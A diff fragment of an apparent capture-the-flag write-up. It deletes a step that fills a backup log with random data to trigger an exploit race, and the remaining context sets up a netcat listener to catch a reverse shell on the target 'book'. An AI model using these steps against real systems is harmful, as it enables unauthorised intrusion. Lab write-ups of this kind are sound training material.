@@ -550,11 +550,6 @@ Waiting 1 seconds before writing payload...
 Done!
 ~~~
 
-At the same time, we log into the target machine with another terminal, generate and write random data to the polling log:
-~~~
-reader@book:~$ head -c 15M < /dev/urandom > backups/access.log
-~~~
-
 On our Kali machine we set up a listener with `root@kali:~# nc -nlvp 4444`
 
 It takes several trials before it works and the shell is unstable but it finally works.
